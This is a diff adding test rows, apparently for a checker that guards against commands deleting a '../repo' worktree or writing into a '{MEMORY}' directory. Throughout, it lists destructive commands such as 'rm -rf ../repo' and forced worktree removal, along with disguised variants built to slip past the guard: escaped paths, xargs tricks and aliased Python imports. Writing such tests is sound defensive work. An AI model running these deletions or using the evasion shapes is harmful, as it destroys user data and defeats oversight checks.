+added by CRW-895 (a shape the issue rules imply)	echo ../repo | xargs env rmdir	CRW-895-e35	row	-
+added by CRW-895 (a shape the issue rules imply)	echo ../repo | (xargs rmdir)	CRW-895-e36	row	-
+added by CRW-895 (a shape the issue rules imply)	f() { echo ../repo; }; f | xargs rmdir	CRW-895-e37	row	-
+added by CRW-895 (a shape the issue rules imply)	find .. -maxdepth 1 -name repo | xargs git worktree remove	CRW-895-e38	row	-
+added by CRW-895 (a shape the issue rules imply)	find ../repo -exec sh -c 'rm "$1"' _ {} \;	CRW-895-d19	row	-
+added by CRW-895 (a shape the issue rules imply)	find .. . -name x -delete	CRW-895-d20	row	-
+added by CRW-895 (a shape the issue rules imply)	find -H .. -name x -delete	CRW-895-d21	row	-
+added by CRW-895 (a shape the issue rules imply)	find -D tree .. -name x -delete	CRW-895-d22	row	-
+added by CRW-895 (a shape the issue rules imply)	find ../repo \( -name x -o -true \) -delete	CRW-895-d23	row	-
+added by CRW-895 (a shape the issue rules imply)	find ../repo -name x -prune -o -delete	CRW-895-d24	row	-
+added by CRW-895 (a shape the issue rules imply)	find -delete	CRW-895-d25	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find ../repo -name '*' -delete	CRW-895-f1	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find ../repo -path '*' -delete	CRW-895-f2	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find ../repo -regex '.*' -delete	CRW-895-f3	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find ../repo -name '????' -delete	CRW-895-f4	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find . -name '*' -delete	CRW-895-f5	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find ../repo -name '*' -type f -delete	CRW-895-f6	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find ../repo -name 'r*' -delete	CRW-895-f7	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find ../repo ! -name x -delete	CRW-895-f8	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find ../repo ! -name repo -delete	CRW-895-f9	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find . -name 'r*' -delete	CRW-895-f10	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find ../repo -iname 'REPO' -delete	CRW-895-f11	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find ../repo -type f -delete	CRW-895-f12	row	-
+pre-merge evaluation crw895-3d1fe314 (d1)	find ../repo \( -name x -o -name '*' \) -delete	CRW-895-f13	row	-
+pre-merge evaluation crw895-3d1fe314 (d2)	find -files0-from roots.list -type f -delete	CRW-895-g1	row	-
+pre-merge evaluation crw895-3d1fe314 (d2)	find -files0-from - -name x -delete	CRW-895-g2	row	-
+pre-merge evaluation crw895-3d1fe314 (d2)	find -files0-from roots.list -name x -exec rm {} +	CRW-895-g3	row	-
+pre-merge evaluation crw895-3d1fe314 (d2)	find -files0-from roots.list | xargs rmdir	CRW-895-g4	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	printf '../%s\n' repo | xargs git worktree remove --force	CRW-895-h1	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	printf '../re\160o\n' | xargs git worktree remove --force	CRW-895-h2	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	printf '%s/%s\n' .. repo | xargs rmdir	CRW-895-h3	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	printf '%b' '../re\x70o' | xargs rmdir	CRW-895-h4	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	echo -e '../re\x70o' | xargs rmdir	CRW-895-h5	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	echo '.\./repo' | xargs rmdir	CRW-895-h6	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	printf "'../repo'\n" | xargs rmdir	CRW-895-h7	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	printf '%s\n' build/old.o | xargs rm	CRW-895-h8	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	printf '../%s\n' other | xargs rmdir	CRW-895-h9	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	printf '%s\n' ../other ../repo | xargs rmdir	CRW-895-h10	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	printf '%s' .. /repo | xargs rmdir	CRW-895-h11	row	-
+pre-merge evaluation crw895-3d1fe314 (d3)	echo '..\x2frepo' | xargs rmdir	CRW-895-h12	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	echo repo | xargs -I{} git worktree remove --force '../{}'	CRW-895-i1	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	echo repo | xargs -I{} rmdir ../{}	CRW-895-i2	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	echo repo | xargs -i rmdir ../{}	CRW-895-i3	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	echo repo | xargs -I@ rm ../@	CRW-895-i4	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	echo worktree | xargs -I{} git {} remove ../repo	CRW-895-i5	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	echo rm | xargs -I{} {} -rf ../repo	CRW-895-i6	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	ls | xargs -I{} rm ../{}	CRW-895-i7	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	ls | xargs -I{} rm {}	CRW-895-i8	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	echo old.o | xargs -I{} rm build/{}	CRW-895-i9	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	echo build | xargs -I{} rmdir {}	CRW-895-i10	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	printf 'a:../repo' | xargs -d : rmdir	CRW-895-i11	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	printf '../repo' | xargs -0 rmdir	CRW-895-i12	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	printf '../repo\n' | xargs -d '\n' rmdir	CRW-895-i13	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	echo repo | xargs -I{} sh -c 'rmdir ../{}'	CRW-895-i14	row	-
+pre-merge evaluation crw895-3d1fe314 (d4)	ls | xargs -I{} sh -c 'rmdir ../{}'	CRW-895-i15	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	printf '../repoX' | head -c 7 | xargs git worktree remove --force	CRW-895-j1	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	printf 'x../repo' | tail -c 7 | xargs rmdir	CRW-895-j2	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	echo '../repoX' | grep -o '../repo' | xargs rmdir	CRW-895-j3	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	echo ../other | head -n 1 | xargs rmdir	CRW-895-j4	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	echo ../repo | head -n 1 | xargs rmdir	CRW-895-j5	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	echo ../repo | sort -u | xargs rmdir	CRW-895-j6	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	echo ../repo | grep -v x | xargs rmdir	CRW-895-j7	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	printf 'a\n../repo\n' | tail -n 1 | xargs rmdir	CRW-895-j8	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	printf 'X\\\n../repo' | tail -n 1 | xargs rmdir	CRW-895-j9	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	echo '../repoX' | cut -c1-7 | xargs rmdir	CRW-895-j10	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	pwd | xargs git worktree remove	CRW-895-j11	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	realpath . | xargs rmdir	CRW-895-j12	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	git rev-parse --show-toplevel | xargs git worktree remove	CRW-895-j13	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	ls -d .. | xargs rmdir	CRW-895-j14	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	/bin/echo ../repo | xargs rmdir	CRW-895-j15	row	-
+pre-merge evaluation crw895-3d1fe314 (d5)	ls build | xargs rm	CRW-895-j16	row	-
+pre-merge evaluation crw895-3d1fe314 (d6)	find . -type f \( -exec rm {} + \)	CRW-895-k1	row	-
+pre-merge evaluation crw895-3d1fe314 (d6)	find . \( -type f -exec rm {} + \)	CRW-895-k2	row	-
+pre-merge evaluation crw895-3d1fe314 (d6)	find . \( -exec rm {} + \)	CRW-895-k3	row	-
+pre-merge evaluation crw895-3d1fe314 (d6)	find ../repo -type f \( -name x -o -true \) -delete	CRW-895-k4	row	-
+pre-merge evaluation crw895-3d1fe314 (d6)	find . \( -type f -o -type l \) -exec rm {} +	CRW-895-k5	row	-
+pre-merge evaluation crw895-3d1fe314 (d7)	echo ../repo | xargs sh -c 'rm build/old.o'	CRW-895-l1	row	-
+pre-merge evaluation crw895-3d1fe314 (d7)	echo ../repo | xargs sh -c 'rm "$@"' _	CRW-895-l2	row	-
+pre-merge evaluation crw895-3d1fe314 (d7)	find ../repo -exec sh -c 'rm build/old.o' \;	CRW-895-l3	row	-
+pre-merge evaluation crw895-3d1fe314 (d7)	find ../repo -exec bash -c 'rm "$0"' {} \;	CRW-895-l4	row	-
+pre-merge evaluation crw895-3d1fe314 (d7)	find . -exec sh -c 'rm build/old.o' \;	CRW-895-l5	row	-
+pre-merge evaluation crw895-3d1fe314 (c1, d3 formatted operands)	yes ../repo | head -1 | xargs rmdir	CRW-895-m1	row	-
+pre-merge evaluation crw895-3d1fe314 (c1, d3 formatted operands)	awk 'BEGIN{print "../repo"}' | xargs rmdir	CRW-895-m2	row	-
+pre-merge evaluation crw895-3d1fe314 (c1, d3 formatted operands)	ls -d build | xargs rm	CRW-895-m3	row	-
+pre-merge evaluation crw895-3d1fe314 (c1, d3 formatted operands)	printf '%s\n' ../repo | xargs -I{} sh -c 'rmdir {}'	CRW-895-m4	row	-
+second verification of ad1b3d605 (P0 find placeholder in a shell text)	find ../repo -exec sh -c 'git worktree remove --force {}' \;	CRW-895-n1	row	-
+second verification of ad1b3d605 (P0 find placeholder in a shell text)	find .. -exec bash -c 'rm -rf {}' \;	CRW-895-n2	row	-
+second verification of ad1b3d605 (P0 find placeholder in a shell text)	find ../repo -exec sh -c 'rmdir {}' \;	CRW-895-n3	row	-
+second verification of ad1b3d605 (P0 find placeholder in a shell text)	find ../repo -execdir sh -c 'rm -rf "x/{}"' \;	CRW-895-n4	row	-
+second verification of ad1b3d605 (P0 find placeholder in a shell text)	find build -exec sh -c 'rm -rf {}' \;	CRW-895-n5	row	-
+second verification of ad1b3d605 (P0 find placeholder in a shell text)	find . -name '*.o' -exec sh -c 'rm -f {}' \;	CRW-895-n6	row	-
+second verification of ad1b3d605 (P0 find placeholder in a shell text)	find . -exec sh -c 'rm -rf {}' \;	CRW-895-n7	row	-
+second verification of ad1b3d605 (P0 find placeholder in a shell text)	find ../repo -exec sh -c 'rm -rf "$1"' _ {} \;	CRW-895-n8	row	-
+second verification of ad1b3d605 (P0 find placeholder in a shell text)	find ../repo -exec sh -c 'rm build/old.o' \;	CRW-895-n9	row	-
+second verification of ad1b3d605 (P2 POSIX class in a find name pattern)	find ../repo -name '[[:alpha:]]*' -delete	CRW-895-o1	row	-
+second verification of ad1b3d605 (P2 POSIX class in a find name pattern)	find ../repo -name '[[:print:]]*' -delete	CRW-895-o2	row	-
+second verification of ad1b3d605 (P2 POSIX class in a find name pattern)	find ../repo -name '[[:digit:]]*' -delete	CRW-895-o3	row	-
+second verification of ad1b3d605 (P2 POSIX class in a find name pattern)	find ../repo -name '[[:digit:]r]*' -delete	CRW-895-o4	row	-
+second verification of ad1b3d605 (P2 POSIX class in a find name pattern)	find ../repo -name '[^[:alpha:]]*' -delete	CRW-895-o5	row	-
+second verification of ad1b3d605 (P2 filter file operand)	echo ../other | cat roots.list | xargs git worktree remove --force	CRW-895-q1	row	-
+second verification of ad1b3d605 (P2 filter file operand)	echo build | sort roots.list | xargs rmdir	CRW-895-q2	row	-
+second verification of ad1b3d605 (P2 filter file operand)	echo ../other | grep o roots.list | xargs rmdir	CRW-895-q3	row	-
+second verification of ad1b3d605 (P2 filter file operand)	echo build/old.o | cat - | xargs rm	CRW-895-q4	row	-
+second verification of ad1b3d605 (P2 filter file operand)	echo build/old.o | grep old | xargs rm	CRW-895-q5	row	-
+third verification of f0857f317 (P0 find {} sets the context of a shell)	find .. -maxdepth 0 -exec sh -c 'cd {}; rm -rf repo' \;	CRW-895-r1	row	-
+third verification of f0857f317 (P0 find {} sets the context of a shell)	find .. -maxdepth 0 -exec sh -c 'cd {} && git worktree remove --force repo' \;	CRW-895-r2	row	-
+third verification of f0857f317 (P0 find {} sets the context of a shell)	find . -path ./a/b -exec sh -c 'cd {}; rm -rf ../../../repo' \;	CRW-895-r3	row	-
+third verification of f0857f317 (P0 find {} sets the context of a shell)	find . -name b -exec sh -c 'D={}; cd "$D"; rm -rf ../../../repo' \;	CRW-895-r4	row	-
+third verification of f0857f317 (P0 find {} sets the context of a shell)	find . -path ./a/b -exec sh -c 'cd {}/x; rmdir ../../../../repo' \;	CRW-895-r5	row	-
+third verification of f0857f317 (P0 find {} sets the context of a shell)	find . -path ./a/b -exec git -C {}/../.. worktree remove --force ../repo \;	CRW-895-r6	row	-
+third verification of f0857f317 (P0 find {} sets the context of a shell)	find .. -name x -exec sh -c 'cd /tmp/a/b; rm -rf {}' \;	CRW-895-r7	row	-
+third verification of f0857f317 (P0 find {} sets the context of a shell)	find ../repo -exec sh -c 'rm build/old.o' \;	CRW-895-r8	row	-
+third verification of f0857f317 (P0 find {} sets the context of a shell)	find . -name '*.o' -exec sh -c 'cd build; rm -f {}' \;	CRW-895-r9	row	-
+third verification of f0857f317 (P0 find {} sets the context of a shell)	find . -name '*.o' -exec rm -f {}.tmp \;	CRW-895-r10	row	-
+third verification of f0857f317 (P2 find name pattern the reader cannot settle)	find ../repo -name '[[.r.]]*' -delete	CRW-895-r11	row	-
+third verification of f0857f317 (P2 find name pattern the reader cannot settle)	find ../repo -name '[[=r=]]*' -delete	CRW-895-r12	row	-
+third verification of f0857f317 (P2 find name pattern the reader cannot settle)	find ../repo -iname '[[:digit:]]*' -delete	CRW-895-r13	row	-
+fix round after review of cf7844fce (P0 find -regex the reader cannot evaluate guards)	find ../repo -regex '.*\(repo\|x\)' -delete	CRW-895-s1	row	-
+fix round after review of cf7844fce (P0 find -regex the reader cannot evaluate guards)	find ../repo -regextype posix-extended -regex '.*(repo|x)' -delete	CRW-895-s2	row	-
+fix round after review of cf7844fce (P0 find -regex the reader cannot evaluate guards)	find ../repo -iregex '.*\(REPO\|x\)' -delete	CRW-895-s3	row	-
+fix round after review of cf7844fce (P0 find -regex the reader cannot evaluate guards)	find ../repo -regex '\.\./re\(po\)\?' -delete	CRW-895-s4	row	-
+fix round after review of cf7844fce (P0 find -regex the reader cannot evaluate guards)	find .. -maxdepth 0 -regex '.*\(repo\|x\)' -exec rm -rf {} +	CRW-895-s5	row	-
+fix round after review of cf7844fce (P0 find -regex the reader cannot evaluate guards)	find ../repo -maxdepth 0 -regex '.*\(repo\|x\)' -exec git worktree remove --force {} \;	CRW-895-s6	row	-
+fix round after review of cf7844fce (P0 find -regex the reader cannot evaluate guards)	find . -regex '.*\.o' -delete	CRW-895-s7	row	-
+fix round after review of cf7844fce (P0 find -regex the reader cannot evaluate guards)	find . -type f -regex '.*\(o\|a\)' -delete	CRW-895-s8	row	-
+fix round after review of cf7844fce (P0 find -regex the reader cannot evaluate guards)	find . -name '*.o' -regex '.*\(o\|a\)' -delete	CRW-895-s9	row	-
+fix round after review of cf7844fce (P1 regression of the third round (absolute find start from an unknown directory))	find /tmp/build -name '*.o' -exec sh -c 'cd {}; rm x' \;	CRW-895-t1	row	-
+fix round after review of cf7844fce (P1 regression of the third round (absolute find start from an unknown directory))	find /tmp/build -type f -exec sh -c 'D={}; cd "$D"; rm file' \;	CRW-895-t2	row	-
+fix round after review of cf7844fce (P1 regression of the third round (absolute find start from an unknown directory))	find /tmp/build -type f -exec sh -c 'cd {}; rm {}.o' \;	CRW-895-t3	row	-
+fix round after review of cf7844fce (P1 regression of the third round (absolute find start from an unknown directory))	find /tmp/build -type f -exec sh -c 'cd {}/..; rm -f ./stale' \;	CRW-895-t4	row	-
+fix round after review of cf7844fce (P1 regression of the third round (absolute find start from an unknown directory))	find {CHECKOUT} -exec sh -c 'cd {}; rm x' \;	CRW-895-t5	row	-
+fix round after review of cf7844fce (P1 regression of the third round (absolute find start from an unknown directory))	find {CHECKOUT}/.. -maxdepth 0 -exec sh -c 'cd {}; rm x' \;	CRW-895-t6	row	-
+fix round after verification of 9f189ad1 (P0 find -regex syntax the reader does not read)	find ../repo -regex ".*\'" -delete	CRW-895-u1	row	-
+fix round after verification of 9f189ad1 (P0 find -regex syntax the reader does not read)	find ../repo -regex ".*\'" -exec git worktree remove --force {} \;	CRW-895-u2	row	-
+fix round after verification of 9f189ad1 (P0 find -regex syntax the reader does not read)	find ../repo -regex '.*po\>' -delete	CRW-895-u3	row	-
+fix round after verification of 9f189ad1 (P0 find -regex syntax the reader does not read)	find ../repo -regex '\`.*' -delete	CRW-895-u4	row	-
+fix round after verification of 9f189ad1 (P0 find -regex syntax the reader does not read)	find ../repo -regex '.*[\.]po' -delete	CRW-895-u5	row	-
+fix round after verification of 9f189ad1 (P0 find -regex syntax the reader does not read)	find .. -maxdepth 0 -regex ".*\'" -exec rm -rf {} +	CRW-895-u6	row	-
+fix round after verification of 9f189ad1 (P0 find -regex syntax the reader does not read)	find . -regex '.*\.o' -delete	CRW-895-u7	row	-
+fix round after verification of 9f189ad1 (P0 find -regex syntax the reader does not read)	find . -regex '.*/build/.*[0-9]' -delete	CRW-895-u8	row	-
+fix round after verification of 9f189ad1 (P0 find -regex syntax the reader does not read)	find . -regex '.*[[:digit:]]' -delete	CRW-895-u9	row	-
+fix round after verification of 9f189ad1 (P0 find -regex syntax the reader does not read)	find . -regex '^\./src/.*$' -delete	CRW-895-u10	row	-
+fix round after verification of 9f189ad1 (P1 start points re-judged from an unknown directory)	find build -type d -exec sh -c 'cd {}; rm -f stale' \;	CRW-895-v1	row	-
+fix round after verification of 9f189ad1 (P1 start points re-judged from an unknown directory)	find src -exec sh -c 'D={}; cd "$D"; rm x' \;	CRW-895-v2	row	-
+fix round after verification of 9f189ad1 (P1 start points re-judged from an unknown directory)	find . -exec sh -c 'cd {}; rm x' \;	CRW-895-v3	row	-
+fix round after verification of 9f189ad1 (P1 start points re-judged from an unknown directory)	find .. -maxdepth 0 -exec sh -c 'cd {}; rm x' \;	CRW-895-v4	row	-
+fix round after verification of 9f189ad1 (P1 start points re-judged from an unknown directory)	find build -type d -exec sh -c 'cd $X; rm -rf {}' \;	CRW-895-v5	row	-
+fix round after verification of 9f189ad1 (P1 prefix before {})	find . -maxdepth 1 -name '*.tmp' -exec rm -f build/{} \;	CRW-895-w1	row	-
+fix round after verification of 9f189ad1 (P1 prefix before {})	find . -maxdepth 1 -name '*.tmp' -exec rm -f /tmp/stash/{} \;	CRW-895-w2	row	-
+fix round after verification of 9f189ad1 (P1 prefix before {})	find . -name '*.tmp' -exec rm -rf ../{} \;	CRW-895-w3	row	-
+fix round after verification of 9f189ad1 (P1 prefix before {})	find . -name x -exec rm -rf ../repo/{} \;	CRW-895-w4	row	-
+fix round after verification of 9f189ad1 (P1 prefix before {})	find ../build -name x -exec rm -rf build/{} \;	CRW-895-w5	row	-
+fix round after verification of 9f189ad1 (P1 prefix before {})	find . -name x -exec rm -rf {}/../.. \;	CRW-895-w6	row	-
+fix round after verification of 632401ae (P1 escaped literal read as match-all)	find . -regex '.*\*' -delete	CRW-895-x1	row	-
+fix round after verification of 632401ae (P1 escaped literal read as match-all)	find ../repo -regex '.*\.' -delete	CRW-895-x2	row	-
+fix round after verification of 632401ae (P1 escaped literal read as match-all)	find . -regex '.*\$' -delete	CRW-895-x3	row	-
+fix round after verification of 632401ae (P1 escaped literal read as match-all)	find . -regex '.*\^' -delete	CRW-895-x4	row	-
+fix round after verification of 632401ae (P1 escaped literal read as match-all)	find . -regex '.*\\' -delete	CRW-895-x5	row	-
+fix round after verification of 632401ae (P1 escaped literal read as match-all)	find .. -maxdepth 0 -regex '.*\.' -exec rm -rf {} +	CRW-895-x6	row	-
+fix round after verification of 632401ae (P1 escaped literal read as match-all)	find ../repo -regex '.*' -delete	CRW-895-x7	row	-
+fix round after verification of 632401ae (P1 escaped literal read as match-all)	find ../repo -regex '\(.*\)' -delete	CRW-895-x8	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'if True: from shutil import copy; copy("/w/a", "{MEMORY}/n.md")'	CRW-900-D1-01	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'if True: import shutil as s; s.copy("/w/a", "{MEMORY}/n.md")'	CRW-900-D1-02	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'def f(): import shutil; shutil.copy("/w/a", "{MEMORY}/n.md")'	CRW-900-D1-03	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'import shutil as os; os.copy("/w/a", "{MEMORY}/n.md")'	CRW-900-D2-01	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'import os as shutil; shutil.rename("/w/a", "{MEMORY}/n.md")'	CRW-900-D2-02	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'from os import renames as mv; mv(old="/w/a", new="{MEMORY}/n.md")'	CRW-900-D3-01	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'from os import rename as renames; renames(src="/w/a", dst="{MEMORY}/n.md")'	CRW-900-D3-02	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'from shutil import copy as Path; Path("/w/a", "{MEMORY}/n.md")'	CRW-900-D4-01	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'from os import rename as open; open("/w/a", "{MEMORY}/n.md")'	CRW-900-D4-02	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'from pathlib import Path; Path("{MEMORY}/n.md").read_text()'	CRW-900-C-01	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'import shutil; shutil.copy("{MEMORY}/n.md", "/w/b")'	CRW-900-C-02	row	-
+CRW-900 completion (D1-D4, Linear CRW-900 comments of 10-07)	python3 -c 'import os; os.rename("/w/a", "/w/b")'	CRW-900-C-03	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'def f(): import shutil as s; s.copy("/w/a", "{MEMORY}/n.md")'	CRW-900-D1-04	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'if True: from shutil import copy as c; c("/w/a", "{MEMORY}/n.md")'	CRW-900-D1-05	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'def f(): import os as shutil; shutil.rename("/w/a", "{MEMORY}/n.md")'	CRW-900-D2-03	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'import json as shutil; shutil.copy("/w/a", "{MEMORY}/n.md")'	CRW-900-D2-04	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'from shutil import copy as c; c("/w/a", "{MEMORY}/n.md")'	CRW-900-D4-03	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'from shutil import copy as c; c("{MEMORY}/n.md", "/w/b")'	CRW-900-C-04	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'import os as shutil; shutil.rename("/w/a", "/w/b")'	CRW-900-C-05	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'from os import rename; rename("/w/a", "/w/b")'	CRW-900-C-06	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'import shutil as s; s.copy("{MEMORY}/n.md", "/w/b")'	CRW-900-C-07	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'from shutil import copy as c; g = c; g("/w/a", "{MEMORY}/n.md")'	CRW-900-D4-04	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'from shutil import copy as c; run(c, "/w/a", "{MEMORY}/n.md")'	CRW-900-D4-05	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'from shutil import copy, move; copy("/w/a", "{MEMORY}/n.md")'	CRW-900-D4-06	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'from shutil import copy, move; copy("{MEMORY}/n.md", "/w/b")'	CRW-900-C-08	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'import os as shutil; def f(shutil): shutil.copy("/w/a", "{MEMORY}/n.md")'	CRW-900-D2-05	row	-
+CRW-900 fix round (post-evaluation of 0e215a28, findings d1-d4)	python3 -c 'import json as os; def f(os): os.rename("/w/a", "{MEMORY}/n.md")'	CRW-900-D2-06	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -e 'w {MEMORY}/a'	CRW-1063-01	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt --expression='w {MEMORY}/a'	CRW-1063-02	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -ne 'w {MEMORY}/a'	CRW-1063-03	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -e'w {MEMORY}/a'	CRW-1063-04	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt --expr 'w {MEMORY}/a'	CRW-1063-05	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -s -e 'W {MEMORY}/a'	CRW-1063-06	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -i -e 'w {MEMORY}/a'	CRW-1063-07	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -i.bak --expression='s/a/b/w {MEMORY}/a'	CRW-1063-08	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed 's/a/b/' x.txt -i {MEMORY}/a	CRW-1063-09	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed 's/a/b/' x.txt --in-place=.bak {MEMORY}/a	CRW-1063-10	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed x.txt -e 'w {MEMORY}/a'	CRW-1063-11	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed 'w {MEMORY}/a' x.txt -e p	CRW-1063-12	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -l 5 -e 'w {MEMORY}/a'	CRW-1063-13	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -e p -e 'w {MEMORY}/a'	CRW-1063-14	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -n --expression 'W {MEMORY}/a'	CRW-1063-15	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed -n p x.txt -E -e 'w {MEMORY}/a'	CRW-1063-16	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -ni -e 'w {MEMORY}/a'	CRW-1063-17	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt --in-place --expression='w {MEMORY}/a'	CRW-1063-18	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -z -e 'W {MEMORY}/a'	CRW-1063-19	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -u -e 'w {MEMORY}/a'	CRW-1063-20	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -e p	CRW-1063-21	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -i -e p	CRW-1063-22	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed -n p x.txt --expression p	CRW-1063-23	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -i'{MEMORY}/*'	CRW-1063-24	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt --in-place='{MEMORY}/*'	CRW-1063-25	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -ni'{MEMORY}/*'	CRW-1063-26	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -i'{MEMORY}/*' -i	CRW-1063-27	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	sed p x.txt -i '{MEMORY}/a'	CRW-1063-28	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	bash -c "sed p x.txt -e 'w {MEMORY}/a'"	CRW-1063-29	row	-
+CRW-1063 (sed argument orders checked against GNU sed 4.9, CRW-1063)	env sed p x.txt -e 'w {MEMORY}/a'	CRW-1063-30	row	-
